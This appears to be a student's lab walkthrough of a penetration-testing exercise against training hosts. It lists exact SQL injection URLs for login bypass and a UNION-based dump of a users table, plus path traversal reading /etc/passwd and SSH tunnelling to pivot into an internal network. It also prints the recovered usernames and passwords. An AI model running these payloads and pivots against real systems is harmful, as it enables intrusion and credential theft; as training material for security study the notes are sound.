Target 1 : 10.50.90.39.220
`student@lin-ops:~$ nmap -T4 -Pn -sT -v 10.50.39.220`
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
`student@lin-ops:~$ nmap -v -sT -Pn -T4 --script http-enum 10.50.39.220 -p 80`
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
fire up browser 
in browser: 10.50.90.39.220
click on everything
in file to read box on get careeers tried command injection "; whoami" , sql "tom OR 1=" , or traversal which worked "../../../../../etc/passwd"
../../../../../etc/hosts
[view page source]
192.168.28.181 WebApp
know we know there is another network
apply for a position here has spot to upload but there is no way to run the uploads = dead end
employee sign in try command injection: didnt work, directory transersal: didnt work, try sql injection: `tom' or 1='1`'
use F12 > network > click login > click in request and throw it at the end of url insert ?
`http://10.50.39.220/login.php?username=tom%27+or+1%3D%271&passwd=tom%27+or+1%3D%271`
vulnerable to sql injection through get method
Array
(
    [0] => user2
    [name] => user2
    [1] => RntyrfVfNER78
    [pass] => RntyrfVfNER78
)
1Array
(
    [0] => user3
    [name] => user3
    [1] => Obo4GURRnccyrf
    [pass] => Obo4GURRnccyrf
)
1Array
(
    [0] => Lee_Roth
    [name] => Lee_Roth
    [1] => anotherpassword4THEages
    [pass] => anotherpassword4THEages
)

we only use base64 and rot13 in this class
user2 - EaglesIsARE78
user3 - Bob4THEEapples
Lee_Roth - anotherpassword4THEages
see user2 creds on scripts/development.py 

now lets get on this box
`student@lin-ops:~$ ssh -MS /tmp/red user2@10.50.39.220`
bash
sudo -l 
find / -type f -perm /6000 -ls 2>/dev/null
cat /etc/crontab

nothing of interest yet

$ bash
user2@PublicFacingWebsite:/$  for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=2.26 ms
64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=1.63 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.540 ms (IGNORE)

note: have to be in bash shell to perform ping sweep 

`student@lin-ops:~$ ssh -S /tmp/red red -O forward -D9050`
`student@lin-ops:~$ proxychains nmap -T4 -Pn -sT -v 192.168.28.172,181,190`
Nmap scan report for 192.168.28.172
Host is up (0.0013s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 192.168.28.181
Host is up (0.0014s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 192.168.28.190
Host is up (0.0010s latency).
All 1000 scanned ports on 192.168.28.190 are closed

lets tackle the port 80 on .181
set up another tunnel 
`student@lin-ops:~$ ssh -S /tmp/red red -O forward -L 1601:192.168.28.181:80`
(can run nikto but didnt quite get command to work on my end)
go to website
`http://0.0.0.0:1601/`
`http://0.0.0.0:1601/pick.php?product=4&Submit=Submit`
`http://0.0.0.0:1601/pick.php?product=4 OR 1=1 ;`
`http://0.0.0.0:1601/pick.php?product=7%20OR%201=1%20;`    find that it is product 7 to conduct sql injection
`http://0.0.0.0:1601/pick.php?product=7%20UNION%20select%201,2,3;` to see how many columns that it needs and in this case it is 3
see that 1 , 3 , 2 is the way it prints 
`http://0.0.0.0:1601/pick.php?product=7%20UNION%20SELECT%20table_schema,column_name,table_name%20FROM%20information_schema.columns;` put column_name in spot 2 so it pints at the end
`http://0.0.0.0:1601/pick.php?product=7%20UNION%20SELECT%20user_id,name,username%20FROM%20siteusers.users`
Aaron - apasswordyPa$$word
user2 - EaglesIsARE78
user3 - Bob4THEEapples
Lee_Roth - Lroth - anotherpassword4THEages
on .181 webapp





